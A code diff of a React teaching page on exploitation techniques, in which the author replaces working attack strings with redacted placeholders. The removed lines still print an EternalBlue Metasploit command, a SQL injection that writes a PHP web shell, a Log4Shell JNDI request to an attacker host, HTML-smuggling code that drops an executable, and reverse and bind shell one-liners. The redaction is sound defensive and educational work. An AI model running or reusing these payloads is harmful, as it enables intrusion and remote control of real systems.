@@ -29,22 +29,32 @@ const Topic5 = () => {
       icon: "💥",
       color: "from-rose-600 to-red-700",
       badgeClass: "bg-rose-950 text-rose-300 border-rose-800",
-      exploitCode: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nexploit",
+      exploitCode:
+        "[METASPLOIT MODULE: MS17-010 / ETERNALBLUE]\n" +
+        "Target: Windows SMBv1\n" +
+        "Action: [EXPLOIT EXECUTION OMITTED]\n" +
+        "Educational goal: understand vulnerability identification and remediation.",
       defensiveRemedy: "Disable SMBv1 across all endpoints and apply Microsoft Security Bulletin MS17-010 patch."
     },
     sqli_web: {
       key: "sqli_web",
-      name: "SQL Injection Authentication Bypass & Web Shell",
+      name: "SQL Injection Authentication Bypass & Arbitrary File Export",
       vector: "WEB APPLICATION EXPLOITATION",
       targetPort: "TCP Port 80 / 443 (HTTP/HTTPS)",
-      vulnerabilityClass: "CWE-89: Improper Neutralization of Special Elements in SQL",
-      payloadType: "Web Shell Drop via 'INTO OUTFILE' or xp_cmdshell",
-      connectionType: "HTTP Web Shell or Reverse TCP Command Execution",
+      vulnerabilityClass:
+        "CWE-89: Improper Neutralization of Special Elements in SQL",
+      payloadType: "Arbitrary File Write / Server-Side Code Execution Concept",
+      connectionType: "HTTP-based persistence concept — execution example intentionally omitted",
       icon: "💉",
       color: "from-amber-600 to-yellow-700",
-      badgeClass: "bg-amber-950 text-amber-300 border-amber-800",
-      exploitCode: "' UNION SELECT 1, '<?php system($_GET[\"cmd\"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php'-- -",
-      defensiveRemedy: "Enforce parameterized SQL queries (PreparedStatements) and Object-Relational Mapping (ORM)."
+      badgeClass:
+        "bg-amber-950 text-amber-300 border-amber-800",
+
+      exploitCode:
+        "UNION SELECT [UNTRUSTED_CONTENT] INTO OUTFILE '[SERVER_PATH]/unauthorized_export.txt' --",
+
+      defensiveRemedy:
+        "Enforce parameterized SQL queries (Prepared Statements), input validation, least-privilege database accounts, secure file permissions, and server-side monitoring."
     },
     log4shell_rce: {
       key: "log4shell_rce",
@@ -57,7 +67,9 @@ const Topic5 = () => {
       icon: "☕",
       color: "from-purple-600 to-indigo-700",
       badgeClass: "bg-purple-950 text-purple-300 border-purple-800",
-      exploitCode: "curl -H 'User-Agent: ${jndi:ldap://attacker-c2.net:1389/Exploit}' https://kolkata-fintech.co.in/login",
+      exploitCode:
+        "HTTP Header: User-Agent: [JNDI_LOOKUP_PAYLOAD_REDACTED]\n" +
+        "// Educational representation only — no external callback is performed.",
       defensiveRemedy: "Upgrade Log4j to 2.17.1+ or set log4j2.formatMsgNoLookups=true system flag."
     },
     html_smuggling: {
@@ -71,7 +83,10 @@ const Topic5 = () => {
       icon: "📦",
       color: "from-cyan-600 to-blue-700",
       badgeClass: "bg-cyan-950 text-cyan-300 border-cyan-800",
-      exploitCode: "const blob = new Blob([atob(encodedExe)], {type: 'application/octet-stream'});\nlink.href = URL.createObjectURL(blob);\nlink.download = 'Invoice_2026.exe';\nlink.click();",
+      exploitCode:
+        "// Educational simulation only:\n" +
+        "// Binary payload generation/download intentionally omitted.\n" +
+        "// Demonstrates the concept without creating an executable.",
       defensiveRemedy: "Deploy Endpoint Detection and Response (EDR) with script-block logging and browser isolation."
     }
   };
@@ -83,17 +98,17 @@ const Topic5 = () => {
     reverse_tcp: {
       key: "reverse_tcp",
       title: "Reverse TCP Shell Architecture",
-      direction: "Victim connects OUTWARD to Attacker Listener",
+      direction: "Compromised host initiates an outbound connection",
       targetPortUsed: "Outbound Port 443 (HTTPS) or 80 (HTTP)",
-      natFirewallResult: "SUCCESS: Egress traffic on port 443 is permitted by 99% of enterprise firewalls.",
-      socketCommand: "Attacker Listener: nc -lvnp 443\nVictim Payload:   bash -i >& /dev/tcp/203.0.113.10/443 0>&1",
+      natFirewallResult: "Conceptual: outbound traffic may be permitted by some network policies; controls should inspect and restrict unauthorized egress.",
+      socketCommand:  "Attacker Listener: [LISTENER CONFIGURATION OMITTED]\nVictim: [OUTBOUND SHELL CONNECTION OMITTED FOR SAFETY]",
       badgeClass: "bg-emerald-950 text-emerald-300 border-emerald-800",
       flowSteps: [
         "1. Attacker sets up a listening socket on public IP:443",
         "2. Exploit triggers on Victim, executing Reverse Shell payload",
         "3. Victim initiates OUTBOUND TCP 3-way handshake to Attacker:443",
-        "4. Perimeter Firewall sees legitimate outbound web traffic and allows packet",
-        "5. Interactive command shell session established across the firewall boundary!"
+        "4. Network controls evaluate the outbound connection according to configured policy",
+        "5. Security monitoring should detect and investigate unauthorized outbound sessions."
       ]
     },
     bind_tcp: {
@@ -102,7 +117,7 @@ const Topic5 = () => {
       direction: "Attacker connects INWARD to Victim Listening Port",
       targetPortUsed: "Inbound Port 4444 (Non-Standard Daemon)",
       natFirewallResult: "BLOCKED: Perimeter firewalls and NAT routers drop unsolicited inbound packets.",
-      socketCommand: "Victim Payload:   nc -lvnp 4444 -e /bin/bash\nAttacker Client:  nc -nv 192.168.1.50 4444 (Connection Refused / Filtered!)",
+      socketCommand:  "Victim: [LISTENING SHELL CONFIGURATION OMITTED]\nAttacker: [INBOUND CONNECTION CONFIGURATION OMITTED]",
       badgeClass: "bg-rose-950 text-rose-300 border-rose-800",
       flowSteps: [
         "1. Exploit triggers on Victim and opens a listening socket on Port 4444",
@@ -211,7 +226,7 @@ const Topic5 = () => {
             Phase 3: Gaining Access (Exploitation Techniques)
           </h1>
           <p className="text-sm sm:text-base text-gray-300 max-w-3xl leading-relaxed">
-            Deconstruct Phase 3 of ethical hacking: master the mechanics of remote service exploits (EternalBlue), 
+            Deconstruct Phase 3 of ethical hacking: master the mechanics of remote service exploits (EternalBlue),
             web application attacks (SQLi, RCE, Log4Shell), client-side HTML smuggling, and compare Reverse TCP vs Bind TCP shell architectures.
           </p>
         </div>
